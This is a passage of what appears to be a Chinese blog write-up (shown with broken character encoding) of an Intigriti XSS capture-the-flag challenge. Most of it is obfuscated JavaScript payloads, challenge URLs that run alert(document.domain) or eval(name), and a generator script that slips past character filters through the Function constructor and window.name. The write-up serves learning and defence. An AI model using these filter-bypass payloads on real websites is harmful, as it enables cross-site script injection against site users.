[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]`_${`e`+31[`${``+{}}`[6]+`${``+{}}`[1]+`${``[`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[9]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[5]+`${``[0]}`[1]+`${e}`[15]]`36`+`${0/0}`[1]+`${e}`[21]+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[14]+`${e}`[21]+`${``+{}}`[1]+`${``+{}}`[5]+`${0/0}`[1]+`${``+{}}`[6]+`${``[0]}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`.`+17[`${``+{}}`[6]+`${``+{}}`[1]+`${``[`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[9]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[5]+`${``[0]}`[1]+`${e}`[15]]`36`+`${0/0}`[1]+`${e}`[18]+17[`${``+{}}`[6]+`${``+{}}`[1]+`${``[`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[9]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[5]+`${``[0]}`[1]+`${e}`[15]]`36`+`.`+`${e}`[18]+`${e}`[21]+`${``[0]}`[5]+`${``+{}}`[5]+`e`+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[14]+1+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[15]+`${[][`${``+{}}`[5]+`${``+{}}`[1]+`${``[0]}`[1]+`${e}`[18]+`${``+{}}`[6]+`${e}`[13]+`${``[0]}`[0]+`${``+{}}`[5]+`${``+{}}`[6]+`${``+{}}`[1]+`${e}`[13]]}`[15]}`` `
```

ç¶²å€å‰‡æ˜¯ï¼š

```
https://challenge-0521.intigriti.io/captcha.php?c=[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]`_${`e`%2b31[`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${``[`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[9]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[5]%2b`${``[0]}`[1]%2b`${e}`[15]]`36`%2b`${0/0}`[1]%2b`${e}`[21]%2b`${[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[14]%2b`${e}`[21]%2b`${``%2b{}}`[1]%2b`${``%2b{}}`[5]%2b`${0/0}`[1]%2b`${``%2b{}}`[6]%2b`${``[0]}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`.`%2b17[`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${``[`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[9]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[5]%2b`${``[0]}`[1]%2b`${e}`[15]]`36`%2b`${0/0}`[1]%2b`${e}`[18]%2b17[`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${``[`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[9]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[5]%2b`${``[0]}`[1]%2b`${e}`[15]]`36`%2b`.`%2b`${e}`[18]%2b`${e}`[21]%2b`${``[0]}`[5]%2b`${``%2b{}}`[5]%2b`e`%2b`${[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[14]%2b1%2b`${[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[15]%2b`${[][`${``%2b{}}`[5]%2b`${``%2b{}}`[1]%2b`${``[0]}`[1]%2b`${e}`[18]%2b`${``%2b{}}`[6]%2b`${e}`[13]%2b`${``[0]}`[0]%2b`${``%2b{}}`[5]%2b`${``%2b{}}`[6]%2b`${``%2b{}}`[1]%2b`${e}`[13]]}`[15]}``+`#alert(document.domain)
```

## æŒ‘æˆ°æœ€çŸ­ç¨‹å¼ç¢¼

å¯ä»¥åŸ·è¡Œä»»æ„ç¨‹å¼ç¢¼ä¹‹å¾Œï¼Œé‚„æœ‰ä»€éº¼å¯ä»¥ç©å‘¢ï¼Ÿé‚£å°±æ˜¯æŒ‘æˆ°æœ€çŸ­çš„ç¨‹å¼ç¢¼ï¼è©¦è‘—æŠŠç¨‹å¼ç¢¼å¼„åˆ°æœ€çŸ­çœ‹çœ‹ã€‚

å¯ä»¥æƒ³åˆ°çš„æœ‰ï¼š

1.ä¸è¦ç”¨ ï½€ï½€[0] æ‹¿åˆ° undefinedï¼Œè€Œæ˜¯ç”¨ `e[0]`ï¼Œå¯ä»¥çœä¸€å€‹å­—å…ƒ
2. ``+{} ä¾†æ‹¿ `[object Object]` å…¶å¯¦å¤šæ­¤ä¸€èˆ‰ï¼Œç”¨ `{}` å°±å¥½ï¼Œçœäº†ä¸‰å€‹å­—
3. æœ‰å¯ä»¥ç”¨åˆ° e çš„åœ°æ–¹ç›¡é‡ç”¨åˆ° eï¼Œå› ç‚ºç¨‹å¼ç¢¼æœƒæœ€å°‘


å†ä¾†æˆ‘å€‘æœ¬ä¾†æ˜¯ç”¨ `[]['constructor']` ä¾†æ‹¿åˆ° functionï¼Œé€™æ¨£æœ‰é»å¤ªé•·äº†ï¼Œå¯ä»¥ç”¨å¾ˆç§‘å­¸çš„æ–¹å¼ä¾†æ‰¾å‡ºæœ€çŸ­çš„ï¼š

``` js
let min = 99
let winner = ''
for (let prop of Object.getOwnPropertyNames(Array.prototype)) {
  const len = getString(prop).length
  if (len < min) {
    min = len
    winner = prop
  }
}
console.log(winner, min)
```

æ‰¾å‡ºä¾†çš„å† è»æ˜¯ `some`ï¼Œå¯ä»¥æ‹¿ä¾†å–ä»£æœ¬ä¾†ä½¿ç”¨çš„ `[]['constructor']`ã€‚

æœ€å¾Œå‘¢ï¼Œå› ç‚ºæˆ‘å€‘ä¸éœ€è¦åŸ·è¡Œä»»æ„ç¨‹å¼ç¢¼äº†ï¼Œæ‰€ä»¥ç”¨ `alert(document.domain)` å°±å¥½ï¼Œè‡³æ–¼ `eval(name)` çš„è©±é›–ç„¶ä¹çœ‹ä¹‹ä¸‹æ›´çŸ­ï¼Œä½†å› ç‚ºè¦æ‹¿åˆ° v ä¸å®¹æ˜“ï¼Œæ‰€ä»¥å…¶å¯¦æœƒèŠ±è²»æ›´å¤šå­—å…ƒã€‚

åº•ä¸‹æ˜¯ç”¢ç”Ÿå‡ºä¾†çš„çµæœï¼Œé•·åº¦ 466 å€‹å­—ï¼š

```
length: 466
======= Payload =======
[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`][`${e}`[5]+`${e}`[1]+`${e}`[25]+`${e}`[18]+`${e}`[6]+`${e}`[13]+`${e[0]}`[0]+`${e}`[5]+`${e}`[6]+`${e}`[1]+`${e}`[13]]`_${`${0/0}`[1]+`${e}`[21]+`e`+`${e}`[13]+`${e}`[6]+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[13]+`${e[0]}`[2]+`${e}`[1]+`${e}`[5]+`${e[0]}`[0]+`${e}`[23]+`e`+`${e}`[25]+`${e}`[6]+`.`+`${e[0]}`[2]+`${e}`[1]+`${e}`[23]+`${0/0}`[1]+`${e[0]}`[5]+`${e}`[25]+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[14]}`` `
======= URL =======
https://challenge-0521.intigriti.io/captcha.php?c=[][`${e}`[18]%2b`${e}`[1]%2b`${e}`[23]%2b`e`][`${e}`[5]%2b`${e}`[1]%2b`${e}`[25]%2b`${e}`[18]%2b`${e}`[6]%2b`${e}`[13]%2b`${e[0]}`[0]%2b`${e}`[5]%2b`${e}`[6]%2b`${e}`[1]%2b`${e}`[13]]`_${`${0/0}`[1]%2b`${e}`[21]%2b`e`%2b`${e}`[13]%2b`${e}`[6]%2b`${[][`${e}`[18]%2b`${e}`[1]%2b`${e}`[23]%2b`e`]}`[13]%2b`${e[0]}`[2]%2b`${e}`[1]%2b`${e}`[5]%2b`${e[0]}`[0]%2b`${e}`[23]%2b`e`%2b`${e}`[25]%2b`${e}`[6]%2b`.`%2b`${e[0]}`[2]%2b`${e}`[1]%2b`${e}`[23]%2b`${0/0}`[1]%2b`${e[0]}`[5]%2b`${e}`[25]%2b`${[][`${e}`[18]%2b`${e}`[1]%2b`${e}`[23]%2b`e`]}`[14]}``+`
```

ç”¨ä¾†ç”¢ç”Ÿçš„ç¨‹å¼ç¢¼æ˜¯ï¼š

``` js
const mapping = {
  a: '`${0/0}`[1]',
  b: '`${e}`[2]',
  c: '`${e}`[5]',
  d: '`${e[0]}`[2]',
  e: '`e`',
  f: '`${e[0]}`[4]',
  g: '`${e}`[15]',
  i: '`${e[0]}`[5]',
  j: '`${e}`[3]',
  l: '`${e}`[21]',
  m: '`${e}`[23]',
  n: '`${e}`[25]',
  o: '`${e}`[1]',
  r: '`${e}`[13]',
  s: '`${e}`[18]',
  t: '`${e}`[6]',
  u: '`${e[0]}`[0]',
  ".": '`.`'
}

function getString(str) {
  return str.split('').map(c => mapping[c] || 'errorerror:' + c).join('+')
}

const some = getString('some')
mapping['('] = '`${[][' + some + ']}`[13]'
mapping[')'] = '`${[][' + some + ']}`[14]'

const cons = getString('constructor')
let strConstructor = '``['+ cons + ']'
strConstructor = '`${' + strConstructor + '}`'

const strToString = `${mapping.t}+${mapping.o}+${strConstructor}[9]+${mapping.t}+${mapping.r}+${mapping.i}+${mapping.n}+${mapping.g}`
mapping.v = '31[' + strToString + ']`36`'

const ans = 
  "[][" + 
  getString('some') + 
  "]["+
  getString('constructor') +
  "]`_${" + 
  getString('alert(document.domain)') +
  "}```"

console.log('length:', ans.length)
console.log('======= Payload =======')
console.log(ans)
console.log('======= URL =======')
console.log('https://challenge-0521.intigriti.io/captcha.php?c=' + ans.replace(/\+/g, '%2b'))
```

## å†æ¬¡ç¸®çŸ­

æŠŠä¸Šé¢çš„çµæœæ‹¿å»å¹³å°ä¸Š submit ä¹‹å¾Œï¼Œä½œè€…èªªç›®å‰çœ‹åˆ°æœ€çŸ­çš„æ˜¯ 376 å€‹å­—å…ƒã€‚æˆ‘æƒ³äº†ä¸€é™£å­ç™¼ç¾æƒ³ä¸å¤ªåˆ°ï¼Œç„¶å¾Œå°±éˆæ©Ÿä¸€å‹•æƒ³èªªï¼šã€Œé‚£ä¾†è©¦è©¦çœ‹ v é‚£å€‹æ–¹æ³•å¥½äº†ï¼Œå…ˆä¸ç®¡ç€è¦½å™¨å•é¡Œã€

å¹«å¤§å®¶å›é¡§ä¸€ä¸‹ç€è¦½å™¨å•é¡Œæ˜¯ä»€éº¼ï¼Œé‚£å•é¡Œå°±æ˜¯å¦‚æœæƒ³ç”¨ function to string çš„æ–¹å¼æ‹¿åˆ° vï¼ŒChrome è·Ÿ Firefox ç”¢ç”Ÿçš„çµæœä¸åŒï¼š

``` js
[]['some']+''

// Chrome
"function some() { [native code] }"
v: index 23

// Firefox
"function some() {
    [native code]
}"
v: index 27
```

æ‰€ä»¥åŒä¸€å€‹ payload ç„¡æ³•åŒæ™‚æ‡‰ç”¨åœ¨é€™å…©å€‹ç¶²é ä¸Šé¢ã€‚

å…ˆä¸ç®¡é€™å•é¡Œçš„è©±ï¼Œç”¢ç”Ÿå‡ºä¾†çš„çµæœæ˜¯é€™æ¨£ï¼š

```
length: 376
======= Payload =======
[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`][`${e}`[5]+`${e}`[1]+`${e}`[25]+`${e}`[18]+`${e}`[6]+`${e}`[13]+`${e[0]}`[0]+`${e}`[5]+`${e}`[6]+`${e}`[1]+`${e}`[13]]`_${`e`+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[23]+`${0/0}`[1]+`${e}`[21]+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[13]+`${e}`[25]+`${0/0}`[1]+`${e}`[23]+`e`+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[14]}`` `
======= URL =======
https://challenge-0521.intigriti.io/captcha.php?c=[][`${e}`[18]%2b`${e}`[1]%2b`${e}`[23]%2b`e`][`${e}`[5]%2b`${e}`[1]%2b`${e}`[25]%2b`${e}`[18]%2b`${e}`[6]%2b`${e}`[13]%2b`${e[0]}`[0]%2b`${e}`[5]%2b`${e}`[6]%2b`${e}`[1]%2b`${e}`[13]]`_${`e`%2b`${[][`${e}`[18]%2b`${e}`[1]%2b`${e}`[23]%2b`e`]}`[23]%2b`${0/0}`[1]%2b`${e}`[21]%2b`${[][`${e}`[18]%2b`${e}`[1]%2b`${e}`[23]%2b`e`]}`[13]%2b`${e}`[25]%2b`${0/0}`[1]%2b`${e}`[23]%2b`e`%2b`${[][`${e}`[18]%2b`${e}`[1]%2b`${e}`[23]%2b`e`]}`[14]}`` `
```

376 å€‹å­—ï¼Œè·Ÿå‰›å‰›çš„ 466 æ¯”èµ·ä¾†å°‘äº†å¿«ä¸€ç™¾å€‹ã€‚


ç”¨ä¾†ç”¢ç”Ÿçš„å®Œæ•´ç¨‹å¼ç¢¼ï¼š

``` js
const mapping = {
  a: '`${0/0}`[1]',
  b: '`${e}`[2]',
  c: '`${e}`[5]',
  d: '`${e[0]}`[2]',
  e: '`e`',
  f: '`${e[0]}`[4]',
  g: '`${e}`[15]',
  i: '`${e[0]}`[5]',
  j: '`${e}`[3]',
  l: '`${e}`[21]',
  m: '`${e}`[23]',
  n: '`${e}`[25]',
  o: '`${e}`[1]',
  r: '`${e}`[13]',
  s: '`${e}`[18]',
  t: '`${e}`[6]',
  u: '`${e[0]}`[0]',
  ".": '`.`'
}

function getString(str) {
  return str.split('').map(c => mapping[c] || 'errorerror:' + c).join('+')
}

const some = getString('some')
mapping['('] = '`${[][' + some + ']}`[13]'
mapping[')'] = '`${[][' + some + ']}`[14]'

mapping.v = '`${[][' + getString('some') + ']}`[23]'

const ans = 
  "[][" + 
  getString('some') + 
  "]["+
  getString('constructor') +
  "]`_${" + 
  getString('eval(name)') +
  "}```"

console.log('length:', ans.length)
console.log('======= Payload =======')
console.log(ans)
console.log('======= URL =======')
console.log('https://challenge-0521.intigriti.io/captcha.php?c=' + ans.replace(/\+/g, '%2b'))
```

æœ‰äº›äººå¯èƒ½ä¸çŸ¥é“ç‚ºä»€éº¼ `eval(name)` å¯ä»¥ï¼Œé€™æ˜¯å› ç‚º `window.name` æ˜¯å€‹ç¥å¥‡çš„å±¬æ€§ï¼ŒåŸºæœ¬ä¸ŠåŒä¸€å€‹åˆ†é çš„ name æœƒç›¸åŒï¼Œæ‰€ä»¥æˆ‘å€‘åªè¦è‡ªå·±æ–°å»ºä¸€å€‹ htmlï¼Œè£¡é¢å¯« JS ä¸¦ä¸”è¨­å®š `window.name = 'alert(document.domain)'`ï¼Œç„¶å¾Œç”¨ `location=` è·³è½‰åˆ° PHP é‚£é‚Šï¼Œé‚£è£¡çš„ `name` å°±æœƒæ˜¯æˆ‘å€‘å‰›å‰›è¨­å®šå¥½çš„ã€‚

æ²’éŒ¯ï¼Œè·¨ç¶²åŸŸä¹Ÿé©ç”¨ã€‚

å› ç‚ºæˆ‘æœ€å¾Œè©¦å‡ºä¾†çš„çµæœä¹Ÿæ˜¯ 376 å€‹å­—ï¼Œè·Ÿä½œè€…èªªçš„æœ€çŸ­ payload ç›¸åŒï¼Œè©¢å•éå¾Œç™¼ç¾å…¶å¯¦å°±æ˜¯åŒä¸€å€‹ã€‚

## çµèª

å¾é€™å€‹æŒ‘æˆ°ä¸­å¯ä»¥å­¸åˆ°ä¸€äº› JS ç›¸é—œçš„æ±è¥¿ï¼Œåƒæ˜¯ï¼š

1. åœ¨é™åˆ¶ä¹‹ä¸‹æ¹Šå‡ºæŒ‡å®šå­—å…ƒ
2. ç”¨åå¼•è™Ÿ backtick ä¾†å‘¼å«å‡½å¼ä»¥åŠåƒæ•¸çš„è¦å‰‡
3. ç”¨ function constructor å‹•æ…‹å»ºç«‹å‡½å¼

é€™äº›çŸ¥è­˜åœ¨ä»€éº¼æ™‚å€™æœƒæœ‰ç”¨å‘¢ï¼Ÿå°æ”»æ“Šè€…è€Œè¨€ï¼Œç•¶ä½ ç¢°åˆ°ä¸€å€‹æœ‰éæ¿¾å­—å…ƒçš„åœ°æ–¹çš„æ™‚å€™ï¼Œå°±å¯ä»¥åˆ©ç”¨é€™äº›æŠ€å·§æƒ³è¾¦æ³•ç¹éé™åˆ¶ã€‚

å°é˜²ç¦¦æ–¹ä¾†èªªï¼Œåœ¨éæ¿¾æ™‚å°±éœ€è¦è€ƒé‡åˆ°é€™äº›ç¹éçš„æ–¹æ³•ï¼Œå¦‚æœçŸ¥é“å¯ä»¥é€™æ¨£ç¹éï¼Œå°±èƒ½æŠŠ filter è¨‚å¾—æ›´ç²¾ç¢ºã€‚

ä¸éé€™éƒ½åªæ˜¯å¾Œè©±ï¼Œå°æˆ‘ä¾†èªªæœƒè§£é€™äº›é¡Œç›®åªæ˜¯å› ç‚ºå¥½ç©ï¼Œä¹Ÿæ²’æœ‰å»æƒ³èªªæœƒæœ‰ä»€éº¼å¹«åŠ©ï¼Œé‚£äº›éƒ½æ˜¯ä»¥å¾Œçš„äº‹äº†ã€‚

é€™å€‹å¹³å°æ¯å€‹æœˆéƒ½æœƒæœ‰ XSS æŒ‘æˆ°ï¼ŒæœŸå¾…ä¹‹å¾Œçš„æ›´å¤šæŒ‘æˆ°ï¼

